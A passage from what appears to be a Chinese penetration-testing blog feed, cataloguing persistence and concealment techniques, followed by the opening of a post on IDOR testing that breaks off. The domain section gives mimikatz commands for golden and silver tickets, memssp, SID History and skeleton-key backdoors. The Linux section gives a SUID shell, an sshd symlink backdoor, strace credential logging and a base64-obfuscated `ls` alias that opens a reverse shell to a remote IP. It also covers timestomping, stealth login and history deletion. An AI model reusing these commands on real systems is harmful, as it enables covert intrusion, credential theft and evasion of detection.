class="language-none">上帝模式.&#123;ED7BA470-8E54-465E-825C-99712043E01C&#125;CLSIDexcel.&#123;00020810-0000-0000-C000-000000000046&#125;word.&#123;00020900-0000-0000-C000-000000000046&#125;media.&#123;00022603-0000-0000-C000-000000000046&#125;CAB.&#123;0CD7A5C0-9F37-11CE-AE65-08002B2E1262&#125;计划任务.&#123;148BD520-A2AB-11CE-B11F-00AA00530503&#125;搜索-计算机&#123;1f4de370-d627-11d1-ba4f-00a0c91eedba&#125;网上邻居.&#123;208D2C60-3AEA-1069-A2D7-08002B30309D&#125;我的电脑.&#123;20D04FE0-3AEA-1069-A2D8-08002B30309D&#125;控制面板.&#123;21EC2020-3AEA-1069-A2DD-08002B30309D&#125;打印机.&#123;2227A280-3AEA-1069-A2DE-08002B30309D&#125;html.&#123;25336920-03f9-11cf-8fd0-00aa00686f13&#125;mht.&#123;3050F3D9-98B5-11CF-BB82-00AA00BDCE0B&#125;mshta.&#123;3050f4d8-98B5-11CF-BB82-00AA00BDCE0B&#125;我的文档.&#123;450D8FBA-AD25-11D0-98A8-0800361B1103&#125;XML.&#123;48123bc4-99d9-11d1-a6b3-00c04fd91555&#125;回收站(满).&#123;5ef4af3a-f726-11d0-b8a2-00c04fc309a4&#125;回收站.&#123;645FF040-5081-101B-9F08-00AA002F954E&#125;ftp_folder.&#123;63da6ec0-2e98-11cf-8d82-444553540000&#125;网络和拨号连接.&#123;7007ACC7-3202-11D1-AAD2-00805FC1270E&#125;写字板文档.&#123;73FDDC80-AEA9-101A-98A7-00AA00374959&#125;Temporary Offline Files Cleaner.&#123;750fdf0f-2a26-11d1-a3ea-080036587f03&#125;用户和密码.&#123;7A9D77BD-5403-11d2-8785-2E0420524153&#125;Internet 临时文件.&#123;7BD29E00-76C1-11CF-9DD0-00A0C9034933&#125;已下载的程序文件的清除程序.&#123;8369AB20-56C9-11D0-94E8-00AA0059CE02&#125;公文包.&#123;85BBD920-42A0-1069-A2E4-08002B30309D&#125;ActiveX 高速缓存文件夹.&#123;88C6C381-2E85-11D0-94DE-444553540000&#125;mail.&#123;9E56BE60-C50F-11CF-9A2C-00A0C90A90CE&#125;历史记录.&#123;FF393560-C2A7-11CF-BFF4-444553540000&#125;目录.&#123;fe1290f0-cfbd-11cf-a330-00aa00c16e65&#125;Internet Explorer.&#123;FBF23B42-E3F0-101B-8488-00AA003E56F8&#125;Snapshot File.&#123;FACB5ED2-7F99-11D0-ADE2-00A0C90DC8D9&#125;预订文件夹.&#123;F5175861-2688-11d0-9C5E-00AA00A45957&#125;MyDocs Drop Target.&#123;ECF03A32-103D-11d2-854D-006008059367&#125;Policy Package.&#123;ecabaebd-7f19-11d2-978E-0000f8757e2a&#125;搜索结果.&#123;e17d4fc0-5564-11d1-83f2-00a0c90dc849&#125;添加网上邻居.&#123;D4480A50-BA28-11d1-8E75-00C04FA31A86&#125;Paint.&#123;D3E34B21-9D75-101A-8C3D-00AA001A1652&#125;管理工具.&#123;D20EA4E1-3957-11d2-A40B-0C5020524153&#125;字体.&#123;D20EA4E1-3957-11d2-A40B-0C5020524152&#125;Web Folders.&#123;BDEADF00-C265-11d0-BCED-00A0C90AB50F&#125;DocFind Command.&#123;B005E690-678D-11d1-B758-00A0C90564FE&#125;脱机文件夹.&#123;AFDB1F70-2A4C-11d2-9039-00C04F8EEB3E&#125;打印机.&#123;2227A280-3AEA-1069-A2DE-08002B30309D&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>说明：其他手法还有畸形文件夹、保留文件名无法删除和利用 Easy File Locker 实现驱动级文件隐藏等等，或者直接起一个看起来名称很像的文件，比如 Index.php 和 lndex.php，这里其中一个是大写的 i，一个是小写的 L</p><h1 id="域后门"><a href="#域后门" class="headerlink" title="域后门"></a>域后门</h1><h2 id="1、黄金票据"><a href="#1、黄金票据" class="headerlink" title="1、黄金票据"></a>1、黄金票据</h2><p>说明：通过黄金票据可以实现域内任意用户的伪造，因此即使目标域管理员的密码被修改了，通过黄金票据还是能够获取到对方的权限</p><p>在生成黄金票据前，需要先获取以下信息：</p><ul><li>krbtgt 的 NTLM Hash 或 AES-256 值</li><li>伪造的域管理员用户名</li><li>完整的域名</li><li>域 SID</li></ul><blockquote><p>其中 krbtgt 用户是域自带的用户，被 KDC 密钥分发中心服务所使用，属于 Domain Admins 组。在域环境中，每个用户账号的票据都是由 krbtgt 用户所生成的，因此如果知道了 krbtgt 用户的 NTLM Hash 或者 AES-256 值，就可以伪造域内任意用户的身份了。</p></blockquote><p>操作流程：</p><ol><li>使用 mimikatz 在域控上获取 krbtgt 用户的 NTLM HASH</li></ol><pre class="line-numbers language-none"><code class="language-none">mimikatz.exe &quot;lsadump::dcsync &#x2F;domain:teamssix.com &#x2F;user:krbtgt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995893-285294-image.png" alt="img"></p><p>从图中可以看到 krbtgt 的 NTLM Hash 为 d685b9c4fa2d318a9943ed68948af087，SID 为 S-1-5-21-284927032-1122706408-2778656994。此时已知域名为 teamssix.com，那么这时所需要的信息就全了。接着来到一台普通域用户权限的主机下，查看 \dc\c$ 发现时拒绝访问的</p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029234249010.png" alt="image-20231029234249010"></p><ol start="2"><li>制作黄金票据</li></ol><pre class="line-numbers language-none"><code class="language-none">kerberos::golden &#x2F;admin:Administrator &#x2F;domain:teamssix.com &#x2F;sid:S-1-5-21-284927032-1122706408-2778656994 &#x2F;krbtgt:d685b9c4fa2d318a9943ed68948af087 &#x2F;ticket:Administrator.kiribi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995946-803021-image.png" alt="img"></p><ol start="3"><li>使用 mimikatz 进行票据传递</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kerberos::ptt Administrator.kiribi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029234312908.png" alt="image-20231029234312908"></p><p>再次查看 \dc\c$ 发现时就有权限了</p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995960-720803-image.png" alt="img"></p><p>PsExec 也同样可以</p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029161651010.png" alt="image-20231029161651010"></p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995968-949523-image.png" alt="img"></p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029162219603.png" alt="image-20231029162219603"></p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029162836729.png" alt="image-20231029162836729"></p><h2 id="2、白银票据"><a href="#2、白银票据" class="headerlink" title="2、白银票据"></a>2、白银票据</h2><p>白银票据和黄金票据的区别如下：</p><ol><li>白银票据不经过 KDC，因此白银票据日志相对于黄金票据会更少，同时白银票据的日志都在目标服务器上，域控上不会有日志，因此白银票据更加隐蔽。</li><li>白银票据利用服务账户的哈希值，不同于黄金票据利用 krbtgt 账户的哈希值，所以白银票据的权限就远不如黄金票据的权限了。</li></ol><p>想利用白银票据需要先具备以下信息：</p><ul><li>域名</li><li>域 SID</li><li>目标服务器的 FQDN 即完整的域名</li><li>可利用的服务</li><li>服务账户的 NTLM 哈希</li><li>伪造的用户名即任意用户名</li></ul><p>下面以伪造 CIFS 服务的权限为例：</p><ol><li>CIFS 服务常用于 Windows 主机之间的文件共享，首先使用 mimikatz 获取服务账户的 NTLM 哈希，这里使用的 Username 为 DC$ 的 NTLM 哈希</li></ol><pre class="line-numbers language-none"><code class="language-none">.\mimikatz.exe log &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029164442629.png" alt="image-20231029164442629"></p><p>补充：用户名末尾的$符</p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029170542160.png" alt="image-20231029170542160"></p><ol start="2"><li>利用获取到的 Hash 生成白银票据</li></ol><pre class="line-numbers language-none"><code class="language-none">.\mimikatz.exe &quot;kerberos::golden &#x2F;user:t &#x2F;domain:teamssix.com &#x2F;sid:S-1-5-21-284927032-1122706408-2778656994 &#x2F;target:dc &#x2F;rc4:ef9e49a41feaa171f642016fd4cb7e7a &#x2F;service:cifs &#x2F;ptt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995979-523341-image.png" alt="img"></p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029171030803.png" alt="image-20231029171030803"></p><ol start="3"><li>伪造票据后，使用 dir 命令就能获取到目标的 CIFS 服务权限了，除了 CIFS 服务外，还可以伪造 LDAP 等等服务</li></ol><h2 id="3、SSP权限维持"><a href="#3、SSP权限维持" class="headerlink" title="3、SSP权限维持"></a>3、SSP权限维持</h2><p>说明：通过 SSP 权限维持，用户在登录时，密码将会以明文的形式保存在 C:\Windows\System32\mimilsa.log 下。使用 mimikatz 将伪造的 SSP 注入内存，但如果域控重启，被注入内存的伪造 SSP 就会丢失。</p><pre class="line-numbers language-none"><code class="language-none">#在Mimikatz中执行privilege::debugmisc::memssp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231030105213575.png" alt="image-20231030105213575"></p><p>注销当前用户，输入用户名密码后重新登录，就可以获取到明文密码了</p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642996014-193247-image.png" alt="img"></p><p>也可以使用 mimikatz 中的 mimilib.dll 文件进行 SSP 权限维持，这种方法重启后不会失效。</p><h2 id="4、SID-History后门"><a href="#4、SID-History后门" class="headerlink" title="4、SID History后门"></a>4、SID History后门</h2><p>说明：每个用户都有自己的安全标识符即 SID，SID History的作用是在域迁移过程中保持域用户的访问权限，即如果迁移后用户的SID改变了，系统会将其原来的SID添加到迁移后用户的SID History属性中，使迁移后的用户保持原有权限、能够访问其原来可以访问的资源。</p><p>操作手法：</p><ol><li>这里使用 mimikatz 将管理员的 SID 添加到普通用户的 SID History 中</li></ol><pre class="line-numbers language-none"><code class="language-none">privilege::debugsid::patchsid::add &#x2F;sam:test &#x2F;new:administrator<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642996022-70539-image.png" alt="img"></p><ol start="2"><li>使用 test 用户登录，可以看到已经拥有了管理员权限</li></ol><img src="https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-01-24/1642996033-818900-image.png" alt="img" style="zoom:200%;"><h2 id="5、万能密码"><a href="#5、万能密码" class="headerlink" title="5、万能密码"></a>5、万能密码</h2><p>说明：在域管权限下，使用 mimikatz 即可</p><pre class="line-numbers language-none"><code class="language-none">.\mimikatz.exe &quot;privilege::debug&quot; &quot;misc::skeleton&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642996044-182676-image.png" alt="img"></p><p>此时，就可以在域内以任意用户的身份利用 mimikatz 密码进行登录了</p><pre class="line-numbers language-none"><code class="language-none">net use \\dc\ipc$ &quot;mimikatz&quot; &#x2F;user:teamssix\administrator<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029173359750.png" alt="image-20231029173359750"></p><p>IPC$共享是Windows系统中的一个特殊隐藏共享，用于进程间通信。通过建立与IPC$共享的连接，可以与远程计算机进行某些操作，例如执行命令、访问共享文件夹等。</p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642996053-90546-image.png" alt="img"></p><p>除了上面的方法外，还可以使用 DSRM 账号进行权限维持，也可以使用 Hook PasswordChangeNotify 脚本查看目标用户修改后的新密码。</p><h1 id="Linux主机后门"><a href="#Linux主机后门" class="headerlink" title="Linux主机后门"></a>Linux主机后门</h1><h2 id="1、添加用户"><a href="#1、添加用户" class="headerlink" title="1、添加用户"></a>1、添加用户</h2><pre class="line-numbers language-none"><code class="language-none">#一句话添加用户（test:123456）useradd test;echo -e &quot;123456\n123456\n&quot; |passwd test#或者使用openssluseradd -p &#96;openssl passwd -1 -salt &#39;salt&#39; 123456&#96; guest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2、SUID-Shell"><a href="#2、SUID-Shell" class="headerlink" title="2、SUID Shell"></a>2、SUID Shell</h2><p>说明：SUID Shell是一种可用于以拥有者权限运行的shell</p><pre class="line-numbers language-none"><code class="language-none">#以root用户权限执行下面的命令cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;shellchmod u+s &#x2F;tmp&#x2F;shell#在使用普通用户权限的时候，执行以下命令就能获取root权限&#x2F;tmp&#x2F;shell -p<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642996062-570634-image.png" alt="img"></p><h2 id="3、软链接"><a href="#3、软链接" class="headerlink" title="3、软链接"></a>3、软链接</h2><p>说明：软链接的利用前提是 ssh 配置中开启了 PAM 进行身份验证</p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029193747195.png" alt="image-20231029193747195"></p><pre class="line-numbers language-none"><code class="language-none">#使用以下命令查看是否配置PAM认证cat &#x2F;etc&#x2F;ssh&#x2F;sshd_config | grep UsePAM#在目标主机上创建一句话后门ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su;&#x2F;tmp&#x2F;su -oPort&#x3D;8888#然后直接ssh root@IP -p 8888，输入任意密码，就可以登录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231030105239917.png" alt="image-20231030105239917"></p><h2 id="4、strace后门-或称alias-后门"><a href="#4、strace后门-或称alias-后门" class="headerlink" title="4、strace后门(或称alias 后门)"></a>4、strace后门(或称alias 后门)</h2><p>alias命令介绍：</p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029200325656.png" alt="image-20231029200325656"></p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029200428340.png" alt="image-20231029200428340"></p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231030105401109.png" alt="image-20231030105401109"></p><p>strace命令介绍：</p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029195323749.png" alt="image-20231029195323749"></p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029195352272.png" alt="image-20231029195352272"></p><p>利用方式：</p><pre class="line-numbers language-none"><code class="language-none">alias ssh&#x3D;&#39;strace -o &#x2F;tmp&#x2F;.ssh.log -e read,write,connect -s 2048 ssh&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这时当用户使用 ssh 连接其他主机时，在 &#x2F;tmp&#x2F;.ssh.log 下就能看到连接的密码、操作了，只是显示的不是很直观，如下</p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231030105433940.png" alt="image-20231030105433940"></p><p>另一种利用方式</p><pre class="line-numbers language-none"><code class="language-none">alias ls&#x3D;&#39;alerts()&#123; ls $* --color&#x3D;auto;python3 -c &quot;import base64,sys;exec(base64.b64decode(&#123;2:str,3:lambda b:bytes(b,&#39;\&#39;&#39;UTF-8&#39;\&#39;&#39;)&#125;[sys.version_info[0]](&#39;\&#39;&#39;aW1wb3J0IG9zLHNvY2tldCxzdWJwcm9jZXNzOwpyZXQgPSBvcy5mb3JrKCkKaWYgcmV0ID4gMDoKICAgIGV4aXQoKQplbHNlOgogICAgdHJ5OgogICAgICAgIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCiAgICAgICAgcy5jb25uZWN0KCgiMTkyLjE2OC4yNDEuMTI4IiwgNjY2NikpCiAgICAgICAgb3MuZHVwMihzLmZpbGVubygpLCAwKQogICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSwgMSkKICAgICAgICBvcy5kdXAyKHMuZmlsZW5vKCksIDIpCiAgICAgICAgcCA9IHN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCAiLWkiXSkKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBleGl0KCk&#x3D;&#39;\&#39;&#39;)))&quot;;&#125;;alerts&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的 base64 解码后为以下内容</p><pre class="line-numbers language-none"><code class="language-none">import os,socket,subprocess;ret &#x3D; os.fork()if ret &gt; 0:    exit()else:    try:        s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)        s.connect((&quot;192.168.241.128&quot;, 6666))        os.dup2(s.fileno(), 0)        os.dup2(s.fileno(), 1)        os.dup2(s.fileno(), 2)        p &#x3D; subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;, &quot;-i&quot;])    except Exception as e:        exit()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样当用户使用 ls 命令时，就会反弹 shell 回来了，当然除了反弹 shell 还可以做很多的其他操作</p><h2 id="5、使用screen命令后台运行"><a href="#5、使用screen命令后台运行" class="headerlink" title="5、使用screen命令后台运行"></a>5、使用screen命令后台运行</h2><p>说明：利用screen命令让命令在后台运行实现权限维持</p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029211243551.png" alt="image-20231029211243551"></p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029211419320.png" alt="image-20231029211419320"></p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029211428846.png" alt="image-20231029211428846"></p><pre class="line-numbers language-none"><code class="language-none">#发现screen#查看进程寻找ps -aux | grep screen#或者 screen -ls 可以看到当前是否有 screen 在后台运行#使用screen建立新的终端screen -S screenname#Ctrl+a+d(Mac 是 control+a+d)退出 screen 并使命令在后台运行#screen -r screenname 进入刚才的终端<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>除此之外，还有比较常见的定时任务、SSH 公钥登录以及 SSH warpper、openssh 后门、PAM 后门、rootkit 后门等等</p></blockquote><h1 id="Linux文件隐藏"><a href="#Linux文件隐藏" class="headerlink" title="Linux文件隐藏"></a>Linux文件隐藏</h1><h2 id="1、隐藏文件时间戳"><a href="#1、隐藏文件时间戳" class="headerlink" title="1、隐藏文件时间戳"></a>1、隐藏文件时间戳</h2><pre class="line-numbers language-none"><code class="language-none">#复制其他文件的时间touch -r teamssix.txt evil.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029195215049.png" alt="image-20231029195215049"></p><pre class="line-numbers language-none"><code class="language-none">#自定义文件的时间，这里演示将时间改为 2022 年的 1 月 1 日 1 时 1 分 1 秒touch -t 202201010101.01 evil.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231030105452885.png" alt="image-20231030105452885"></p><h2 id="2、隐身登录"><a href="#2、隐身登录" class="headerlink" title="2、隐身登录"></a>2、隐身登录</h2><p>说明：隐身登录系统，不会被 w、who、last 检测到</p><p>w命令介绍：</p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029204745282.png" alt="image-20231029204745282"></p><pre class="line-numbers language-none"><code class="language-none">#显示当前登录用户的信息w#显示短格式的用户信息w -s#显示用户的空闲时间w -u#显示用户的登录IP地址w -i<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029204956273.png" alt="image-20231029204956273"></p><p>last命令介绍：</p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029204346797.png" alt="image-20231029204346797"></p><pre class="line-numbers language-none"><code class="language-none">#显示最近的登录记录last#显示特定用户的登录记录last username#显示最近的10条登录记录last -n 10#显示登录IP地址last -i#显示指定时间范围内的登录记录last --since &quot;2023-10-01&quot; --until &quot;2023-10-15&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>隐身登录手法：</p><pre class="line-numbers language-none"><code class="language-none">#一般隐身登录ssh -T root@host &#x2F;bin&#x2F;bash -i#隐身登录系统，同时不保存公钥在本地的 .ssh 目录中ssh -o UserKnownHostsFile&#x3D;&#x2F;dev&#x2F;null -T user@host &#x2F;bin&#x2F;bash –i<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3、锁定文件"><a href="#3、锁定文件" class="headerlink" title="3、锁定文件"></a>3、锁定文件</h2><p>说明：当文件被锁定时，是无法删除的</p><pre class="line-numbers language-none"><code class="language-none">#锁定文件chattr +i evil.txt#属性查看lsattr  evil.txt#解除锁定chattr -i evil.txt#删除文件rm -rf 1.evil.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231030094648542.png" alt="image-20231030094648542"></p><h2 id="4、隐藏历史操作记录"><a href="#4、隐藏历史操作记录" class="headerlink" title="4、隐藏历史操作记录"></a>4、隐藏历史操作记录</h2><pre class="line-numbers language-none"><code class="language-none">#临时禁用历史命令记录功能（注意在 set 命令前有一个空格） set +o history#如果想某条命令不记录到 history 中，直接在命令前加上空格就行，如 ls、 pwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231030094351564.png" alt="image-20231030094351564"></p><pre class="line-numbers language-none"><code class="language-none">#或者使用grep过滤出history中要删除的文件行，再 -d 指定行即可删除，比如第11行记录history | grep &quot;key&quot;history -d 11<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>除此之外，还有在文件前加上 . 实现隐藏文件以及端口复用、进程隐藏等等方法。</p></blockquote><h1 id="鸣谢"><a href="#鸣谢" class="headerlink" title="鸣谢"></a>鸣谢</h1><ul><li><a href="https://zone.huoxian.cn/d/860/2">https://zone.huoxian.cn/d/860/2</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>越权漏洞测试手法与技巧</title>
      <link href="/2023/10/27/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%89%8B%E6%B3%95%E4%B8%8E%E6%8A%80%E5%B7%A7/"/>
      <url>/2023/10/27/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%89%8B%E6%B3%95%E4%B8%8E%E6%8A%80%E5%B7%A7/</url>
      
        <content type="html"><![CDATA[<h1 id="猜测接口找到越权漏洞"><a href="#猜测接口找到越权漏洞" class="headerlink" title="猜测接口找到越权漏洞"></a>猜测接口找到越权漏洞</h1><ol><li><p>使用f12开发者工具，寻找js文件，里面一般会有一些接口，形如：api&#x2F;模块名、api&#x2F;v1&#x2F;模块名、域名&#x2F;api&#x2F;模块名、域名&#x2F;api&#x2F;v1&#x2F;模块名【在找 js 文件的时候，可以关注下有没有以 runtime 命名的 js 文件，因为在这种 js 文件中会包含其他 js 文件的名称（包括当前页面没有加载的 js 文件），这样利用 runtime js 文件就发现了更多的 js 文件，使得找到 api 接口的概率又大了些】</p></li><li><p>尝试访问接口，直接在浏览器输入接口网址即可</p></li><li><p>判断一下该接口的作用(添加？删除？修改？查询？)，以确定下一步的构造【比如，某个js文件中只有查询的接口，那么接下来可以尝试一下构造添加、修改和删除接口】<img src="/2023/10/27/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%89%8B%E6%B3%95%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20231027141911393.png" alt="image-20231027141911393"></p></li><li><p>尝试构造接口，下面是一些后台模块常见的接口格式</p><p>添加接口</p><ul><li>POST&#x2F;PUT &#x2F;api&#x2F;模块名</li><li>POST &#x2F;api&#x2F;模块名&#x2F;add</li></ul><p>删除接口</p><ul><li>DELETE &#x2F;api&#x2F;模块名&#x2F;id</li><li>GET &#x2F;api&#x2F;模块名&#x2F;del?id&#x3D;</li><li>POST &#x2F;api&#x2F;模块名&#x2F;</li></ul><p>修改接口</p><ul><li>POST &#x2F;api&#x2F;模块名&#x2F;modify</li><li>POST &#x2F;api&#x2F;模块名&#x2F;</li></ul><p>查询接口</p><ul><li>GET &#x2F;api&#x2F;模块名&#x2F;list</li><li>GET &#x2F;api&#x2F;模块名&#x2F;all</li></ul><p>其他说明</p><ul><li>POST发包的值常为{}，即{“键1”:”值”,”键2”:”值”}</li></ul></li></ol><p>前端接口信息本质上是JS信息收集，可以使用工具：</p><ul><li>JSFinder：<a href="https://github.com/Threezh1/JSFinder">https://github.com/Threezh1/JSFinder</a></li><li>URLFinder：<a href="https://github.com/pingc0y/URLFinder">https://github.com/pingc0y/URLFinder</a></li></ul><p>这里再说明一下为什么要多多关注JS文件：JS文件与HTML、CSS等文件统一作为前端文件，是可以通过浏览器访问到的，相对于HTML和CSS等文件的显示和美化作用，JS文件将会能够将页面的功能点进行升华。对于渗透测试来说，&#x3D;&#x3D;JS文件不仅仅能够找到一些URL、内网IP地址、手机号、调用的组件版本等信息，还存在一些接口，因为前端需要，所以一些接口将会在JS文件中直接或间接呈现&#x3D;&#x3D;</p><h1 id="微信小程序接口未授权"><a href="#微信小程序接口未授权" class="headerlink" title="微信小程序接口未授权"></a>微信小程序接口未授权</h1><h2 id="微信小程序解包"><a href="#微信小程序解包" class="headerlink" 